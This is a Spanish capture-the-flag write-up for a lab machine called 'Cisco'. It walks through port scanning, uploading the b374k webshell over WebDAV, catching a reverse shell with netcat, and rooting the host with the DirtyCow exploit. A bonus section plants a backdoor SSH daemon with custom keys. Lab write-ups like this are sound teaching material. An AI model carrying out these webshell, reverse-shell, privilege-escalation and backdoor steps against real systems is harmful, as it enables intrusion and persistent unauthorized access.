# Hackplayers 2018 - Cisco

Maquina ‘Cisco’ 10.42.0.150

Si realizamos un escaneo básico con nmap encontramos los siguientes servicios

```
$ nmap -sV 10.42.0.150
22/tcp    open  ssh     OpenSSH 5.5p1 Debian 6+squeeze5 (protocol 2.0)
5000/tcp  open  http    nginx 0.7.67
8081/tcp  open  http    Apache httpd 2.2.16
```

Estos servicios web no disponen de una página inicial, por lo que debemos utilizar una herramienta de *fuzzing* para encontrar directorios o archivos ocultos.

![](img/cisco-web1.png)

![](img/cisco-web2.png)

Para encontrar el servicio vulnerable, debemos realizar un escaneo de puertos mas extenso

```
$ nmap -sV -p- 10.42.0.150
15200/tcp open  http    Apache httpd 2.2.16
```

De igual forma, en un primer acceso nos devuelve un error 403, por lo que igualmente buscamos archivos ocultos con dirb o wfuzz.

```
$ dirb http://10.42.0.150:15200
---- Scanning URL: http://10.42.0.150:15200/ ----
+ http://10.42.0.150:15200/server-status (CODE:403|SIZE:295)
==> DIRECTORY: http://10.42.0.150:15200/upload/
==> DIRECTORY: http://10.42.0.150:15200/webdav/
```

La existencia del directorio webdav ya nos sirve para intentar subir archivos. Aunque no es la única forma de llegar a esta conclusión. Podemos obtener la lista de métodos HTTP permitidos con una petición *OPTIONS* o incluso utilizando la herramienta de escaneo de vulnerabilidades Nikto.

```
$ curl -I -X OPTIONS 10.42.0.150:15200
HTTP/1.1 200 OK
Date: Fri, 26 Jan 2018 11:29:49 GMT
Server: Apache/2.2.16 (Debian)
DAV: 1,2
DAV: <http://apache.org/dav/propset/fs/1>
MS-Author-Via: DAV
Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK
```

```
$ nikto -host http://10.42.0.150:15200
...
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST, DELETE, TRACE, PROPFIND, PROPPATCH, COPY, MOVE, LOCK, UNLOCK 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (COPY PROPPATCH LOCK PROPFIND UNLOCK listed as allowed)
```

Para subir nuestra webshell favorita utilizamos la herramienta cadaver. En mi caso he utilizado la webshell [b374k](https://github.com/b374k/b374k)

```
$ cadaver http://10.42.0.150:15200/webdav/
dav:/webdav/> put b374k.php
Uploading b374k.php to '/webdav/b374k.php':
Progress: [=============================>] 100.0% of 74132 bytes succeeded.
```

Utilizamos la webshell para conseguir una shell reversa.


![](img/cisco-b374k.png)

```
$ nc -nlvp 8080
connect to [10.42.0.201] from (UNKNOWN) [10.42.0.150] 58959
b374k shell : connected
/>whoami
www-data
/>find / -name *flag* 2>/dev/null
/home/bob/flag.txt
/>cat /home/bob/flag.txt
cat: /home/bob/flag.txt: Permission denied
```

Al parecer, debemos conseguir acceder como el usuario bob para leer el archivo flag.txt.

Una de las formas de acceder como bob es utilizar las credenciales `bob:bob` en el servicio ssh. Aunque yo utilicé un método distinto.

Aunque existe otra forma sencilla de escalar privilegios directamente al usuario root, utilizando DirtyCow. Para ello existe una lista con multiples exploits en <https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54>, entre ellos utilizamos c0w.c en su versión de 32bits.

```
/tmp>gcc -pthread c0w.c  -o c0w
/tmp>./c0w
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap b765d000
madvise 0

/tmp>passwd
whoami
root
cat /home/bob/flag.txt
Flag{8f9f...}
cat /root/flag.txt
Flag{59bk...}
```

## Bonus: Acceso interactivo por ssh con el usuario www-data

Aunque para realizar la prueba no es necesario conseguir una shell totalmente interactiva, quise probar a levantar el servicio de ssh con una configuración personalizada. Los requisitos son que el usuario www-data se le permita hacer login, y tener un directorio propio donde subir los archivos de claves.

```
$ find / -user www-data -type d -ls 2>/dev/null | grep -v '/proc/'
209688    4 drwxr-xr-x   4 www-data www-data     4096 Jan 26 16:05 /var/cache/apache2
209689    4 drwxr-xr-x   2 www-data www-data     4096 Jan 28  2014 /var/cache/apache2/mod_disk_cache
210213    4 drwxr-xr-x   2 www-data root         4096 Jan 22 21:15 /var/lock/apache2
297282    4 drwx------   2 www-data www-data     4096 Jan 22 22:41 /tmp/vmware-www-data
```

```
cd /var/cache/apache2
mkdir -v ssh
chmod 700 ssh
cd ssh
echo '-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvDarg8hPv45FHxzZslEnEkCQrzHEcKzWJRndIX7haJikqFLC
...
UeUfZQIy4G2nvfoAldyfi16WQz08J3jWxJDVrZUjpsNR33DawVs5
-----END RSA PRIVATE KEY-----' > ssh_host_rsa_key
chmod 600 ssh_host_rsa_key
echo 'ssh-rsa AAAAB3Nz...xOyv' > authorized_keys
chmod 600 authorized_keys

# Launch SSH server
/usr/sbin/sshd -D -p 2222 -o "PermitRootLogin yes" -o "AuthorizedKeysFile /var/cache/apache2/ssh/authorized_keys" -o "UsePrivilegeSeparation no" -o "HostKey /var/cache/apache2/ssh/ssh_host_rsa_key" -o "RSAAuthentication yes" -o "PubkeyAuthentication yes" -d
```

Finalmente accedemos con ```$ ssh www-data@10.42.0.150 -p 2222```

![](img/cisco-ssh.png)

